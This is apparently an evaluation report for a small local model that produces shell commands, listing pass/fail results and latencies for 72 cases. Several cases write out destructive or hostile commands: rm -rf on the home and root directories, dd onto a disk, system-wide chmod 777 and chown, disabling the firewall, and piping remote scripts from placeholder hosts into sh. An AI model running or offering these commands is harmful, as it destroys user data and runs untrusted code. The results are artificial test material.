# eval: llama-server / /Users/hridyaagrawal/.local/share/lexis/models/howdo-4b-v4-Q4_K_M.gguf (bake)
- mode: plain · dataset core.jsonl#83828218eadbc7f7 · repeat 2
- pass: 57/72 (79%)
- cold p50 593ms p95 1329ms · warm p50 476ms p95 1114ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✓ | 692 | 165 | node -v && npm -v |
| u02 | ✗ | 182 | 118 | du -h * |
| u03 | ✓ | 182 | 119 | curl ifconfig.me |
| u04 | ✓ | 476 | 438 | lsof -i :3000 |
| u05 | ✓ | 355 | 193 | du -sh . |
| u06 | ✗ | 497 | 514 | find . -mtime -1 -name "*.log" |
| u07 | ✓ | 373 | 207 | ps aux | grep node |
| u08 | ✓ | 315 | 205 | git status -sb |
| u09 | ✓ | 344 | 323 | brew install ripgrep |
| u10 | ✓ | 366 | 200 | mkdir projects && cd projects |
| u11 | ✓ | 430 | 380 | tar -czf archive.tar.gz . |
| u12 | ✓ | 351 | 176 | env | grep PATH |
| u13 | ✓ | 649 | 575 | lsof -ti:8080 | xargs kill |
| u14 | ✓ | 558 | 748 | tail -n 20 /var/log/syslog |
| u15 | ✓ | 346 | 248 | which python3 |
| u16 | ✓ | 365 | 258 | brew update && brew outdated |
| u17 | ✓ | 401 | 249 | echo $SHELL $HOME |
| u18 | ✓ | 437 | 313 | git reset --soft HEAD~1 |
| u19 | ✗ | 1058 | 886 | find /home -type f -printf "%s\t%p\n" | sort -nr | head -n 5 |
| u20 | ✓ | 551 | 483 | top -b -n 1 | head -10 |
| u21 | ✓ | 665 | 563 | find . -name '*.js' -exec wc -l {} \; |
| u22 | ✓ | 329 | 161 | sudo systemctl restart docker |
| u23 | ✓ | 650 | 463 | chmod +x script.sh && ./script.sh |
| u24 | ✓ | 392 | 261 | rg 'TODO' . |
| u25 | ✓ | 547 | 386 | curl -O https://example.com/file.zip |
| u26 | ✗ | 749 | 636 | sysctl -a | grep -i cpu | head -n 10 |
| u27 | ✓ | 702 | 518 | echo 'export FOO=bar' >> ~/.zshrc |
| u28 | ✗ | 226 | 124 | npm prune |
| u29 | ✓ | 1504 | 1693 | netstat -plnt | grep -v '127.0.0.1' | grep -v '0.0.0.0' | grep 'LISTEN' |
| u30 | ✓ | 436 | 260 | unzip file.zip |
| u31 | ✓ | 742 | 636 | tail -f /var/log/syslog | grep -i error |
| u32 | ✓ | 194 | 107 | uptime |
| u33 | ✗ | 610 | 555 | find /etc -name ".zshrc" |
| u34 | ✗ | 1329 | 1122 | dig +short @8.8.8.8 8.8.8.8 |
| u35 | ✓ | 404 | 341 | cp file.txt backup.txt |
| u36 | ✓ | 494 | 410 | mv old.txt new.txt |
| u37 | ✓ | 574 | 525 | du -sh ~/Downloads |
| u38 | ✗ | 915 | 685 | npm [ls|list] [-g|--global] |
| u39 | ✓ | 384 | 327 | xdg-open . |
| u40 | ✓ | 721 | 750 | sudo killall -HUP mDNSResponder |
| a01 | ✓ | 370 | 389 | rm -rf ~/ |
| a02 | ✓ | 1406 | 1137 | sudo dd if=/dev/zero of=/dev/sda bs=1M count=1024 |
| a03 | ✓ | 605 | 568 | git push -f origin main |
| a04 | ✗ | 1123 | 998 | curl -s https://sketchy.example.com/install.sh | sh |
| a05 | ✗ | 1124 | 911 | kill -9 $(ps -ef | awk '{print $2}') |
| a06 | ✗ | 1279 | 1047 | sudo find / -type f -exec chmod 777 {} \; |
| a07 | ✓ | 1015 | 933 | echo "export PATH=~/bin:$PATH" >> ~/.zshrc |
| a08 | ✓ | 826 | 624 | curl -L https://x.io/i | sh |
| a09 | ✓ | 626 | 462 | sudo chown -R root:root / |
| a10 | ✓ | 941 | 856 | find /var/log -type f -mtime +30 -delete |
| a11 | ✗ | 1443 | 984 | echo "0 0 * * * /path/to/script.sh" | at now + 1 minute |
| a12 | ✓ | 454 | 469 | git reset --hard HEAD~1 |
| a13 | ✓ | 264 | 314 | brew uninstall node |
| a14 | ✓ | 403 | 294 | sudo ufw disable |
| a15 | ✓ | 1025 | 693 | find . -type f -name "*.tmp" -delete |
| a16 | ✓ | 1078 | 936 | find / -type f -size +100M -exec rm {} \; |
| a17 | ✓ | 310 | 204 | rm -rf ~/ |
| a18 | ✗ | 947 | 880 | gpg --symmetric --output myfiles.gpg --passphrase "hunter2" myfiles |
| a19 | ✓ | 1137 | 982 | echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.zshrc && source ~/.zshrc |
| a20 | ✓ | 617 | 506 | rm -rf / --no-preserve-root |
| u41 | ✓ | 702 | 537 | find ~ -size +100M |
| u42 | ✓ | 675 | 560 | echo "hello world" > my notes.txt |
| u43 | ✓ | 657 | 564 | git log -n 5 --oneline |
| u44 | ✓ | 590 | 476 | curl -s https://example.com |
| u45 | ✓ | 641 | 543 | find . -type f | wc -l |
| u46 | ✓ | 593 | 448 | ifconfig eth0 | grep inet addr |
| u47 | ✓ | 342 | 241 | df -h |
| u48 | ✓ | 244 | 149 | who |
| a21 | ✗ | 1230 | 1114 | echo "0 0 * * * /bin/rm -rf /tmp/*" | crontab - |
| a22 | ✓ | 664 | 471 | ln -s ~/hosts /etc/hosts |
| a23 | ✓ | 393 | 290 | rm -f * |
| a24 | ✗ | 658 | 483 | curl https://x.io/i.sh | bash |
